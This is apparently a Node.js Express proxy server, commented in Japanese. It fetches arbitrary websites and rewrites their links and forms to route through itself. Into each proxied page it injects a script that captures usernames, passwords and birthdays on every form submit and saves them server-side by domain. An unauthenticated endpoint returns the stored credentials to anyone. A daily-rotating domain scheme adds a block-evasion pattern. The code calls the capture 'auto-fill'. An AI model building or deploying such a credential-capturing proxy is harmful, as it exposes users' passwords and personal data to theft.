const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// JSON のパースを有効にする（個人情報保存用エンドポイント用）
app.use(express.json());

// サーバー内に個人情報を保存するためのメモリストア
// キーはサイトのドメイン、値は { username, password, birthday, ... } のオブジェクト
const personalInfoStore = {};

// URLを日付ごとに変更するためのファイルパス
const urlFilePath = path.join(__dirname, 'current_url.txt');

// public フォルダ内の静的ファイルを配信
app.use(express.static('public'));

/**
 * 新しいURLを生成する（例として日付による固定URL）
 */
function getNewUrl() {
  const today = new Date();
  // ※例: 毎日異なるドメイン名。実際の運用に合わせて生成方法を変更してください。
  const newUrl = `https://example-${today.getFullYear()}-${today.getMonth() + 1}-${today.getDate()}.com`;
  return newUrl;
}

/**
 * 新しいURLをファイルに保存する
 */
function saveNewUrl() {
  const newUrl = getNewUrl();
  fs.writeFileSync(urlFilePath, newUrl, 'utf8');
}

/**
 * ファイルから現在のURLを取得する
 */
function getCurrentUrl() {
  try {
    return fs.readFileSync(urlFilePath, 'utf8');
  } catch (err) {
    console.error('URL読み込みエラー:', err);
    return null;
  }
}

// サーバー起動時にファイルがなければ初期生成
if (!fs.existsSync(urlFilePath)) {
  saveNewUrl();
}

/**
 * /fetch?url=… 
 * － 指定 URL の内容をそのまま取得（タイムアウトなしで読み込めるまで待機）し、
 * － コンテンツが HTML の場合は cheerio で <a> および <form> の URL を書き換え、
 *    内部で history 操作と個人情報自動入力を行うためのスクリプトを注入する。
 */
app.get('/fetch', async (req, res) => {
  const targetUrl = req.query.url;
  if (!targetUrl) {
    return res.status(400).send('URLパラメータが必要です');
  }

  try {
    // axiosでリクエスト時、標準的なブラウザと同等のヘッダーを付与
    const response = await axios.get(targetUrl, { 
      responseType: 'arraybuffer',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8'
      }
    });
    const contentType = response.headers['content-type'] || 'text/html';
    res.set('Content-Type', contentType);

    if (contentType.includes('text/html')) {
      let html = response.data.toString('utf8');
      const $ = cheerio.load(html);

      // <a> タグの href 書き換え：クリック時に常に /fetch?url=… 経由でアクセス
      $('a').each((i, elem) => {
        const href = $(elem).attr('href');
        if (href) {
          try {
            const newHref = new URL(href, targetUrl).href;
            $(elem).attr('href', '/fetch?url=' + encodeURIComponent(newHref));
            $(elem).attr('target', '_self');
          } catch (error) {
            // 書き換えできない場合はそのまま
          }
        }
      });

      // <form> タグの action 書き換え：送信先を /fetch?url=… に変更
      $('form').each((i, elem) => {
        const action = $(elem).attr('action');
        if (action) {
          try {
            const newAction = new URL(action, targetUrl).href;
            $(elem).attr('action', '/fetch?url=' + encodeURIComponent(newAction));
          } catch (error) {
            // エラー時はそのまま
          }
        }
      });

      // 自動入力＆history上書き用スクリプトの定義
      const autoFillScript = `
<script>
(function() {
  // history の pushState, replaceState を上書きして内部ナビゲーションをプロキシ経由に
  var origPushState = history.pushState;
  var origReplaceState = history.replaceState;
  function reloadProxy(url) {
    window.location.href = '/fetch?url=' + encodeURIComponent(url);
  }
  history.pushState = function(state, title, url) {
    reloadProxy(url);
    return origPushState.apply(history, arguments);
  };
  history.replaceState = function(state, title, url) {
    reloadProxy(url);
    return origReplaceState.apply(history, arguments);
  };
  window.addEventListener('popstate', function(e) {
    reloadProxy(document.location.href);
  });

  // 個人情報自動入力のための処理
  function getQueryParam(param) {
    var params = new URLSearchParams(window.location.search);
    return params.get(param);
  }
  var targetUrl = getQueryParam('url');
  if (!targetUrl) return;
  var siteDomain;
  try {
    var urlObj = new URL(targetUrl);
    siteDomain = urlObj.hostname;
  } catch(e) {
    return;
  }

  fetch('/getPersonalInfo?site=' + encodeURIComponent(siteDomain))
    .then(function(response) { return response.json(); })
    .then(function(data) {
      if (data && typeof data === 'object') {
        document.querySelectorAll('form').forEach(function(form) {
          ['username','user','password','pass','birthday','bday'].forEach(function(fieldName) {
            var input = form.querySelector('[name="'+fieldName+'"]');
            if (input && data[fieldName]) {
              input.value = data[fieldName];
            }
          });
          form.addEventListener('submit', function() {
            var info = {};
            ['username','user','password','pass','birthday','bday'].forEach(function(fieldName) {
              var input = form.querySelector('[name="'+fieldName+'"]');
              if (input && input.value) {
                info[fieldName] = input.value;
              }
            });
            fetch('/savePersonalInfo?site=' + encodeURIComponent(siteDomain), {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(info)
            });
          });
        });
      }
    })
    .catch(function(err) {
      console.error('Auto-fill fetch error:', err);
    });
})();
</script>
      `;
      if ($('head').length > 0) {
        $('head').append(autoFillScript);
      } else {
        $('body').prepend(autoFillScript);
      }

      html = $.html();
      res.send(html);
    } else {
      res.send(response.data);
    }
  } catch (error) {
    console.error('URL取得エラー:', error);
    res.status(500).send('指定URLの取得に失敗しました');
  }
});

// 古いURLでアクセスがあった場合、新しいURLにリダイレクトする処理
app.get('/old-url', (req, res) => {
  const currentUrl = getCurrentUrl();
  if (currentUrl) {
    res.redirect(301, `/fetch?url=${encodeURIComponent(currentUrl)}`);
  } else {
    res.status(500).send('URLが更新されていません');
  }
});

// 個人情報の取得エンドポイント（GET）
app.get('/getPersonalInfo', (req, res) => {
  const site = req.query.site;
  if (!site) return res.status(400).json({});
  const info = personalInfoStore[site] || {};
  res.json(info);
});

// 個人情報の保存エンドポイント（POST）
app.post('/savePersonalInfo', (req, res) => {
  const site = req.query.site;
  if (!site) return res.status(400).send('Site required');
  const info = req.body;
  personalInfoStore[site] = Object.assign({}, personalInfoStore[site], info);
  res.json({ success: true });
});

// サーバー起動
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  setInterval(() => {
    saveNewUrl();
    console.log('新しいURLに更新されました');
  }, 24 * 60 * 60 * 1000);
});
